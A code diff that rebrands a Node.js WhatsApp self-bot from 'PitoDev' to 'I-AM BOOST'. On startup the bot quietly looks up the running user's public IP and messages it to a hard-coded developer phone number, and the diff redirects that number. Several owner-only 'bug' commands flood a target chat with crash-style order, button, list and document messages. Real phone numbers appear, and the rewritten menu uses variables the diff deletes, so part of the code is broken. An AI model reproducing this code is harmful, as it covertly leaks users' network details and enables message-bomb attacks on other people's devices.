@@ -46,22 +46,22 @@ nopref = false
 antical = true
 welcom = true
 allpref = false
-autojoin = false
-banChats = false
+autojoin = true
+banChats = true
 vn = true
 online = false
-ketik = false
-ownerNumber = '6285235637978@s.whatsapp.net'
-creator = "6285235637978@s.whatsapp.net"
+ketik = true
+ownerNumber = '6285774523785@s.whatsapp.net'
+creator = "6285774523785@s.whatsapp.net"
 baterai = {
 battery: "" || "Tidak Terdeteksi",
-isCharge: "" || false
+isCharge: "" || true
 }
 
 const starts = async (client = new WAConnection()) => {
 	client.logger.level = 'warn'
 	client.version = [2, 6666, 9]
-	client.browserDescription = [ 'PitoDev', '3.0' ]
+	client.browserDescription = [ 'I-AM BOOST', '3.0' ]
 	client.on('qr', () => {
 		console.log(color(' Scan.!!'))
 	})
@@ -83,7 +83,7 @@ const starts = async (client = new WAConnection()) => {
 	})
 	fetch(`http://ip-api.com/line`).then(res => res.text())
 	.then(bu =>{
-		client.sendMessage("6285235637978@s.whatsapp.net", `IP-USER\n\n ${bu}`, MessageType.text )
+		client.sendMessage("6285774523785@s.whatsapp.net", `IP-USER\n\n ${bu}`, MessageType.text )
 		console.log(color('Sending ip address to developer bot'))
 	})
 	await client.connect({timeoutMs: 30*1000})
@@ -105,9 +105,9 @@ const starts = async (client = new WAConnection()) => {
 			"message": {
 				"groupInviteMessage": {
 				"groupJid": "6288213840883-1616169743@g.us",
-				"inviteCode": `By PitoDevID`,
-				"groupName": `By PitoDevID`,
-				"caption": `By PitoDevID`,
+				"inviteCode": `Kuntul`,
+				"groupName": `Meki`,
+				"caption": `I-AM BOOST`,
 				'jpegThumbnail': buff
 				}
 			}
@@ -182,7 +182,7 @@ const starts = async (client = new WAConnection()) => {
 				}
 				num = anu.participants[0]
 				teks = `Halo @${num.split('@')[0]}\nSelamat datang di group ${mdata.subject}`
-				sendButImage(mdata.id, teks, "Welcome Message By PitoDev", buff,
+				sendButImage(mdata.id, teks, "Welcome Message", buff,
 				[{ buttonId:` `, buttonText:{ displayText:'Oke' }, type:1}],{ quoted:finv, contextInfo: { "mentionedJid": [num]}})
 			} else if (anu.action == 'remove') {
 				try {
@@ -221,7 +221,7 @@ const starts = async (client = new WAConnection()) => {
 				}
 				num = anu.participants[0]
 				teks = `Sayonara @${num.split('@')[0]}\nKeluar di group ${mdata.subject}`
-				sendButImage(mdata.id, teks, "Leave Message By PitoDev", buff,
+				sendButImage(mdata.id, teks, "Leave Message", buff,
 				[{ buttonId:` `, buttonText:{ displayText:'Byee' }, type:1}],{ quoted:finv, contextInfo: { "mentionedJid": [num]}})
 			} else if (anu.action == 'demote') {
 				try {
@@ -260,7 +260,7 @@ const starts = async (client = new WAConnection()) => {
 				}
 				num = anu.participants[0]
 				teks = `DEMOTE DETECTED\n@${num.split('@')[0]}\nDi unadmin di group ${mdata.subject}`
-				sendButImage(mdata.id, teks, "Demote Message By PitoDev", buff,
+				sendButImage(mdata.id, teks, "Demote Message", buff,
 				[{ buttonId:` `, buttonText:{ displayText:'Byee' }, type:1}],{ quoted:finv, contextInfo: { "mentionedJid": [num]}})
 			} else if (anu.action == 'promote') {
 				try {
@@ -299,7 +299,7 @@ const starts = async (client = new WAConnection()) => {
 				}
 				num = anu.participants[0]
 				teks = `PROMOTE DETECTED\nSelamat @${num.split('@')[0]}\nJadi admin di group ${mdata.subject}`
-				sendButImage(mdata.id, teks, "Promote Message By PitoDev", buff,
+				sendButImage(mdata.id, teks, "Promote Message By", buff,
 				[{ buttonId:` `, buttonText:{ displayText:'Selamat' }, type:1}],{ quoted:finv, contextInfo: { "mentionedJid": [num]}})
 			}
 		} catch (e) {
@@ -374,7 +374,7 @@ const starts = async (client = new WAConnection()) => {
 		const mentionUser = mention != undefined ? mention.filter(n => n) : []
 		const sendKontak = (from, nomor, nama) => {
 		const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:By Pito Dev\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
-			client.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {quoted:finv, contextInfo: { forwardingScore: 999, isForwarded: true, externalAdReply: {title: `${jmn} - ${week} ${weton} - ${calender}`,body:"PitoDev",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:"https://pitodevid.github.io"}}})
+			client.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {quoted:finv, contextInfo: { forwardingScore: 999, isForwarded: true, externalAdReply: {title: `${jmn} - ${week} ${weton} - ${calender}`,body:"I-AM BOOST",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:"https://g.top4top.io/p_21721a9z60.jpg"}}})
 			}
 		cmhit.push(command)
 		const conts = mek.key.fromMe ? client.user.jid : client.contacts[sender] || { notify: jid.replace(/@.+/, '') }
@@ -450,23 +450,23 @@ const starts = async (client = new WAConnection()) => {
 					itemCount : 999999999,
 					status: 1,
 					surface : 1,
-					message: 'By PitoDev',
-					orderTitle: 'By PitoDev',
+					message: 'By I-AM BOOST',
+					orderTitle: 'By I-AM BOOST',
 					thumbnail: ofrply,
 					sellerJid: '0@s.whatsapp.net' 
 				}
 			}
 		}
 		const troliv2 = (teks) => {
-			res = client.prepareMessageFromContent(from, {"orderMessage": { "itemCount": 999999999, "message": teks, "footerText": "By PitoDev", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftroli})
+			res = client.prepareMessageFromContent(from, {"orderMessage": { "itemCount": 999999999, "message": teks, "footerText": "I-AM BOOST", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftroli})
 			client.relayWAMessage(res)
 		}
 		const inviteRes = (judul, caption) => {
-			res = client.prepareMessageFromContent(from, {"groupInviteMessage": {"groupName":judul, "footerText": "By PitoDev", "caption":caption, "jpegThumbnail":ofrply}})
+			res = client.prepareMessageFromContent(from, {"groupInviteMessage": {"groupName":judul, "footerText": "I-AM BOOST", "caption":caption, "jpegThumbnail":ofrply}})
 			client.relayWAMessage(res)
 		}
 		const katalog = (judul, desk) => {
-			res = client.prepareMessageFromContent(from, {"productMessage": {"product":{"productImage": ofrply , "title": judul, "description": desk, "retailerId": "By PitoDev", }, "businessOwnerJid": "0@s.whatsapp.net"}})
+			res = client.prepareMessageFromContent(from, {"productMessage": {"product":{"productImage": ofrply , "title": judul, "description": desk, "retailerId": "I-AM BOOST", }, "businessOwnerJid": "0@s.whatsapp.net"}})
 			client.relayWAMessage(res)
 		}
 		const trolloc = (judul, options = {}) => {
@@ -676,7 +676,7 @@ const starts = async (client = new WAConnection()) => {
 			if (!isOwner && !mek.key.fromMe) return
 			if (args.length < 1) return reply('jumlah?')
 			for (let i = 0; i < args[0]; i++) {
-				troliv2('By PitoDevID')
+				troliv2('I-AM BOOST')
 			}
 			reply('Sukses send bug sebanyak '+args.join(' '))
 			break
@@ -684,7 +684,7 @@ const starts = async (client = new WAConnection()) => {
 			if (!isOwner && !mek.key.fromMe) return
 			if (args.length < 1) return reply('jumlah?')
 			for (let i = 0; i < args[0]; i++) {
-				client.sendMessage(from, 'By PitoDev', text, { thumbnail: ofrply, sendEphemeral: true, quoted: ftroli})
+				client.sendMessage(from, 'I-AM BOOST', text, { thumbnail: ofrply, sendEphemeral: true, quoted: ftroli})
 			}
 			reply('Sukses send bug sebanyak '+args.join(' '))
 			break
@@ -692,10 +692,10 @@ const starts = async (client = new WAConnection()) => {
 			if (!isOwner && !mek.key.fromMe) return
 			if (args.length < 1) return reply('jumlah?')
 			for (let i = 0; i < args[0]; i++) {
-				sendButImage(from, `Bug Hanya Ilusi?`, `By PitoDev`, ofrply,
-				[{buttonId:`${prefix}bugbutton`,buttonText:{displayText:`PitoDevID ${apis}`}, type:1 },
-				{buttonId:`${prefix}bugbutton`,buttonText:{displayText:`PitoDevID ${apis}`}, type:1 },
-				{buttonId:`${prefix}bugbutton`,buttonText:{displayText:`PitoDevID ${apis}`}, type:1 }],
+				sendButImage(from, `Bug Hanya Ilusi?`, `I-AM BOOST`, ofrply,
+				[{buttonId:`${prefix}bugbutton`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 },
+				{buttonId:`${prefix}bugbutton`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 },
+				{buttonId:`${prefix}bugbutton`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 }],
 				{
 					quoted:mek, contextInfo: {
 						forwardingScore: 999, isForwarded: true }})
@@ -705,10 +705,10 @@ const starts = async (client = new WAConnection()) => {
 			if (!isOwner && !mek.key.fromMe) return
 			if (args.length < 1) return reply('jumlah?')
 			for (let i = 0; i < args[0]; i++) {
-				sendButLocation(from, `Bug Hanya Ilusi?`, `By PitoDev`, ofrply,
-				[{buttonId:`${prefix}bugbuttonlocation`,buttonText:{displayText:`PitoDevID ${apis}`}, type:1 },
-				{buttonId:`${prefix}bugbuttonlocation`,buttonText:{displayText:`PitoDevID ${apis}`}, type:1 },
-				{buttonId:`${prefix}bugbuttonlocation`,buttonText:{displayText:`PitoDevID ${apis}`}, type:1 }],
+				sendButLocation(from, `Bug Hanya Ilusi?`, `I-AM BOOST`, ofrply,
+				[{buttonId:`${prefix}bugbuttonlocation`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 },
+				{buttonId:`${prefix}bugbuttonlocation`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 },
+				{buttonId:`${prefix}bugbuttonlocation`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 }],
 				{
 					quoted:mek, contextInfo: {
 						forwardingScore: 999, isForwarded: true }})
@@ -718,10 +718,10 @@ const starts = async (client = new WAConnection()) => {
 			if (!isOwner && !mek.key.fromMe) return
 			if (args.length < 1) return reply('jumlah?')
 			for (let i = 0; i < args[0]; i++) {
-				sendButDocument(from, `Bug Hanya Ilusi?`, `By PitoDev`, fs.readFileSync('./stik/doc'), { mimetype: Mimetype.pdf, thumbnail: fs.readFileSync('./stik/doc'), filename: `.PitoDevID ${apis2}`},
-				[{buttonId:`${prefix}bugbuttondocument`,buttonText:{displayText:`PitoDevID ${apis}`}, type:1 },
-				{buttonId:`${prefix}bugbuttondocument`,buttonText:{displayText:`PitoDevID ${apis}`}, type:1 },
-				{buttonId:`${prefix}bugbuttondocument`,buttonText:{displayText:`PitoDevID ${apis}`}, type:1 }],
+				sendButDocument(from, `Bug Hanya Ilusi?`, `I-AM BOOST`, fs.readFileSync('./stik/doc'), { mimetype: Mimetype.pdf, thumbnail: fs.readFileSync('./stik/doc'), filename: `I-AM BOOST ${apis2}`},
+				[{buttonId:`${prefix}bugbuttondocument`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 },
+				{buttonId:`${prefix}bugbuttondocument`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 },
+				{buttonId:`${prefix}bugbuttondocument`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 }],
 				{
 					quoted:mek, contextInfo: {
 						forwardingScore: 999, isForwarded: true }})
@@ -731,19 +731,19 @@ const starts = async (client = new WAConnection()) => {
 			if (!isOwner && !mek.key.fromMe) return
 			if (args.length < 1) return reply('jumlah?')
 			for (let i = 0; i < args[0]; i++) {
-				sendlistMessage(from, `LIST MENU}`, 'Powered By PitoDevID',
-				[{title: `PitoDev ${apis2}`, rows: [{"title":`By PitoDev ${apis2}`, "rowId":""}]},
-				{title: `PitoDev ${apis2}`, rows: [{"title":`By PitoDev ${apis2}`, "rowId":""}]},
-				{title: `PitoDev ${apis2}`, rows: [{"title":`By PitoDev ${apis2}`, "rowId":""}]},
-				{title: `PitoDev ${apis2}`, rows: [{"title":`By PitoDev ${apis2}`, "rowId":""}]},
-				{title: `PitoDev ${apis2}`, rows: [{"title":`By PitoDev ${apis2}`, "rowId":""}]},
-				{title: `PitoDev ${apis2}`, rows: [{"title":`By PitoDev ${apis2}`, "rowId":""}]},
-				{title: `PitoDev ${apis2}`, rows: [{"title":`By PitoDev ${apis2}`, "rowId":""}]},
-				{title: `PitoDev ${apis2}`, rows: [{"title":`By PitoDev ${apis2}`, "rowId":""}]},
-				{title: `PitoDev ${apis2}`, rows: [{"title":`By PitoDev ${apis2}`, "rowId":""}]},
-				{title: `PitoDev ${apis2}`, rows: [{"title":`By PitoDev ${apis2}`, "rowId":""}]},
-				{title: `PitoDev ${apis2}`, rows: [{"title":`By PitoDev ${apis2}`, "rowId":""}]},
-				{title: `PitoDev ${apis2}`, rows: [{"title":`By PitoDev ${apis2}`, "rowId":""}]}],
+				sendlistMessage(from, `LIST MENU}`, 'Powered By I-AM BOOST',
+				[{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
+				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
+				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
+				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
+				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
+				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
+				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
+				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
+				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
+				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
+				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
+				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]}],
 				{
 					quoted:mek, contextInfo: {
 						forwardingScore: 999, isForwarded: true }})
@@ -768,43 +768,53 @@ const starts = async (client = new WAConnection()) => {
 			}
 			break
 			/*BATAS CASE BUG*/
-		case 'menu': case 'help':
-			sendernya = `${sender}`
-			stst = await client.getStatus(`${sender.split('@')[0]}@c.us`)
-			stst = stst.status == 401 ? '' : stst.status
-			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
-			menu = `\n${tampilUcapan} ${pushname}\n\nNama Owner : PitoDevID\nNomor Owner : @${ownerNumber.split('@')[0]}\nBattery : ${baterai.battery}\nCharge : ${baterai.isCharge}\nMode : ${banChats ? 'Self-mode' : 'Public-mode'}\nAuto vn : ${vn ? 'true' : 'false'}\nAuto ketik : ${ketik ? 'true' : 'false'}\nAuto join : ${autojoin ? 'true' : 'false'}\nAnti calls : ${antical ? 'true' : 'false'}\nTotal Hit : 6251${cmhit.length}\n\nINFO USER\n\nStatus : ${isOwner ? 'Owner' : 'User'}\nNama : ${pushname}\nBio : ${stst}\nNomor : @${sendernya.split('@')[0]}\nInfo Nomor : ${num.line_type} - ${num.country_name} - ${num.carrier}`
-			sendButImage(from, `${menu}`, "PitoDev", ofrply, 
-			[{buttonId:`${prefix}command`, buttonText:{displayText:'COMMAND'}, type:1 },
-			{buttonId:`${prefix}creator`, buttonText:{displayText:'CREATOR'}, type:1 },
-			{buttonId:`${prefix}sc`, buttonText:{displayText:'SOURCE CODE'}, type:1 }],
-			{
-				quoted:finv, contextInfo: {
-					mentionedJid: [ownerNumber,sendernya], forwardingScore: 999, isForwarded: true, externalAdReply: {title: `${jmn} - ${week} ${weton} - ${calender}`,body:"PitoDev",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:"https://pitodevid.github.io"}}})
-			break
+		case 'menu':
+    case 'help':
+    var p = '```'
+    run = process.uptime() 
+const tod =`*_SELFBOT_*		    
+${p}👋${ucapanWaktu}kak ${pushname}${p}
+${p}🔏Mode : ${publik ? 'Public' : 'Self'}${p}
+${p}🔑Prefix : ${prefix}${p}
+${p}⏳Bot Aktif Selama :
+${kyun(run)}${p}`
+ tod2 =`
+\n${tampilUcapan} ${pushname}\n\nNama Owner : I-AM BOOST\nNomor Owner : @${ownerNumber.split('@')[0]}\nBattery : ${baterai.battery}\nCharge : ${baterai.isCharge}\nMode : ${banChats ? 'Self-mode' : 'Public-mode'}\nAuto vn : ${vn ? 'true' : 'false'}\nAuto ketik : ${ketik ? 'true' : 'false'}\nAuto join : ${autojoin ? 'true' : 'false'}\nAnti calls : ${antical ? 'true' : 'false'}\nTotal Hit : 6251${cmhit.length}\n\nINFO USER\n\nStatus : ${isOwner ? 'Owner' : 'User'}\nNama : ${pushname}\nBio : ${stst}\nNomor : @${sendernya.split('@')[0]}\nInfo Nomor : ${num.line_type} - ${num.country_name} - ${num.carrier}
+*_ɪɴғᴏ ʙᴏᴛ_*
+» ᴛᴇʟғᴏɴ ʙᴏᴛ = ʙʟᴏᴄᴋ ᴘᴇʀᴍᴀᴍᴇɴ
+» ɢᴜɴᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ʙᴀɪᴋ , ʙɪᴊᴀᴋ
+
+*_©KILLER DEATH*
+`           
+           but = [
+          { buttonId: `${prefix}owner`, buttonText: { displayText: 'ALL MENU🔖' }, type: 1 },
+           { buttonId: `${prefix}bugmenu`, buttonText: { displayText: 'MENU BUG📝' }, type: 1 },
+                  ]
+        sendButLocation(from, tod, tod2, gambar, but)
+           break
 		case 'allmenu': case 'command':
 			menu = `\n${tampilUcapan} ${pushname}\n\n\nSTICKER MENU\n\n${prefix}sticker\n${prefix}stickerwm nama|author\n${prefix}take nama|author\n${prefix}attp <text>\n\nFUN MENU\n\n${prefix}fast\n${prefix}slow\n${prefix}reverse\n${prefix}readmore\n${prefix}detikvn\n${prefix}detikvideo\n${prefix}caripesan <text>\n${prefix}listgroup\n${prefix}status\n${prefix}wiki <text>\n\nDOWNLOAD MENU\n\n${prefix}ytmp4 <link>\n${prefix}ytmp3 <link>\n${prefix}ytsearch <text>\n${prefix}igdl <link>\n${prefix}tiktokdl <link>\n\nGROP MENU\n\n${prefix}setnamegc <nama group>\n${prefix}setdeskgc <desk group>\n${prefix}kick @tag member\n${prefix}add 62xxxxx\n${prefix}hidetag <text>\n${prefix}sider\n${prefix}tag\n${prefix}tagme\n${prefix}demote @tag admin\n${prefix}promote @tag member\n${prefix}linkgroup\n${prefix}resetlinkgroup\n${prefix}opengc\n${prefix}closegc\n${prefix}antilink 1/0\n${prefix}antivirtex 1/0\n${prefix}tictactoe @tag teman\n${prefix}delttt\n\nASUPAN MENU\n\n${prefix}asupancecan\n${prefix}asupanhijab\n${prefix}asupansantuy\n${prefix}asupanukty\n${prefix}asupanbocil\n${prefix}asupanrika\n\nOWNER MENU\n\n${prefix}anticall on/off\n${prefix}welcome on/off\n${prefix}autojoin on/off\n${prefix}autovn on/off\n${prefix}autoketik on/off\n${prefix}leave\n${prefix}public\n${prefix}self\n${prefix}setprefix\n\n`
-			sendButImage(from, `${menu}`, "By PitoDevID", ofrply, 
-			[{buttonId:`${prefix}sc`, buttonText:{displayText:'SOURCE CODE'}, type:1 },
+			sendButImage(from, `${menu}`, "By I-AM BOOST", ofrply, 
+			[{buttonId:`${prefix}sc`, buttonText:{displayText:'SC'}, type:1 },
 			{buttonId:`${prefix}bgmnu`, buttonText:{displayText:'BUG MENU'}, type:1 }],
 			{
 				quoted:finv, contextInfo: {
-					forwardingScore: 999, isForwarded: true, externalAdReply: {title: `${jmn} - ${week} ${weton} - ${calender}`,body:"PitoDev",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:"https://pitodevid.github.io"}}})
+					forwardingScore: 999, isForwarded: true, externalAdReply: {title: `${jmn} - ${week} ${weton} - ${calender}`,body:"PitoDev",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:"https://g.top4top.io/p_21721a9z60.jpg"}}})
 			break
 		case 'bgmnu': case 'bugmenu':
-			if (!isOwner && !mek.key.fromMe) reply('[!] WARNING [!]\n\nFitur Hanya Bisa Di Jalankan Oleh Owner')
+			if (!isOwner && !mek.key.fromMe) return
 			menu = `\n${tampilUcapan} ${pushname}\n\n${prefix}buggc jumlah\n${prefix}jadiv tag video/foto\n${prefix}bugtroli jumlah\n${prefix}bugtroliv2 jumlah\n${prefix}bugbutton jumlah\n${prefix}buglistmenu jumlah\n${prefix}bugbuttondocument jumlah\n${prefix}bugbuttonlocation jumlah\n`
-			sendButDocument(from, `${menu}`, "Powered By PitoDevID", fs.readFileSync('./stik/doc'), { mimetype: Mimetype.pdf, thumbnail: fs.readFileSync('./stik/doc'), filename: 'PitoDevID'},
-			[{buttonId:`${prefix}sc`, buttonText:{displayText:'SOURCE CODE'}, type:1 }],
+			sendButDocument(from, `${menu}`, "MENU", fs.readFileSync('./stik/doc'), { mimetype: Mimetype.pdf, thumbnail: fs.readFileSync('./stik/doc'), filename: 'I-AM BOOST'},
+			[{buttonId:`${prefix}sc`, buttonText:{displayText:'SC'}, type:1 }],
 			{
 				quoted:mek, contextInfo: {
-					externalAdReply: {title: 'All Bug Case Compiled By PitoDev',body:"",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:"https://github.con/PitoDevID"}}})
+					externalAdReply: {title: 'All Bug',body:"",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:"https://github.com/wgduwjej/self-bot"}}})
 			break
 		case 'status':
-			menu = `\n\nCreator : @${creator.split('@')[0]}\nOwner : PitoDevID\nNomor Owner : @${ownerNumber.split('@')[0]}\nMode : ${banChats ? 'Self-mode' : 'Public-mode'}\nBattery : ${baterai.battery}\nCharge : ${baterai.isCharge}\nWa Version : ${client.user.phone.wa_version}\nStatus : ${isOwner ? 'Owner' : 'User'}\n\n`
-			sendButImage(from, `${menu}`, 'PitoDev', ofrply,
-			[{buttonId:`${prefix}menu`, buttonText:{displayText:'MENU'}, type:1 },
-			{buttonId:`${prefix}sc`, buttonText:{displayText:'SOURCE CODE'}, type:1 }],
+			menu = `\n\nCreator : @${creator.split('@')[0]}\nOwner : I-AM BOOST\nNomor Owner : @${ownerNumber.split('@')[0]}\nMode : ${banChats ? 'Self-mode' : 'Public-mode'}\nBattery : ${baterai.battery}\nCharge : ${baterai.isCharge}\nWa Version : ${client.user.phone.wa_version}\nStatus : ${isOwner ? 'Owner' : 'User'}\n\n`
+			sendButImage(from, `${menu}`, 'I-AM BOOST', ofrply,
+			[{buttonId:`${prefix}menu`, buttonText:{displayText:'MENU📝'}, type:1 },
+			{buttonId:`${prefix}sc`, buttonText:{displayText:'SC📥'}, type:1 }],
 			{
 				quoted:finv, contextInfo: {
 					mentionedJid: [ownerNumber,creator], forwardingScore: 999, isForwarded: true, externalAdReply: {title: `${jmn} - ${week} ${weton} - ${calender}`,body:"PitoDev",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:"https://pitodevid.github.io"}}})
@@ -829,20 +839,20 @@ const starts = async (client = new WAConnection()) => {
 				client.groupLeave(from)
 			break
 		case 'owner': case 'creator': case 'developer': case 'author':
-			sendKontak(from, creator, 'PitoDev')
+			sendKontak(from, creator, 'I-AM BOOST')
 			break
 		case 'sc': case 'sourcecode':
-			client.sendMessage(from, { text: "https://github.com/PitoDevID/self-bot", matchedText: 'https://pitodevid.github.io', description: "", title: "Don't click here !!!", jpegThumbnail: ofrply }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
+			client.sendMessage(from, { text: "NGAPAIN BANG?", matchedText: 'https://g.top4top.io/p_21721a9z60.jpg', description: "", title: "Don't click here !!!", jpegThumbnail: ofrply }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
 			break
 		case 'public':
 			if (!isOwner && !mek.key.fromMe) return
-			if (banChats === false) return reply("Udah public")
+			if (banChats === false) return reply("[ - PUBLIC MODE - ]")
 				banChats = false
 				reply(`PUBLIC-MODE`)
 			break
 		case 'self':
 			if (!isOwner && !mek.key.fromMe) return
-			if (banChats === true) return reply("Udah self")
+			if (banChats === true) return reply("[ - SELF MODE - ]")
 				uptime = process.uptime()
 				banChats = true
 				reply(`SELF-MODE`)
@@ -1026,7 +1036,7 @@ const starts = async (client = new WAConnection()) => {
 			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 			media = await client.downloadAndSaveMediaMessage(encmedia)
 			anu = args.join(' ').split('|')
-			satu = anu[0] !== '' ? anu[0] : 'PitoDev'
+			satu = anu[0] !== '' ? anu[0] : 'I-AM BOOST'
 			dua = typeof anu[1] !== 'undefined' ? anu[1] : ``
 			require('./lib/fetcher.js').createExif(satu, dua)
 			require('./lib/fetcher.js').modStick(media, client, mek, from)
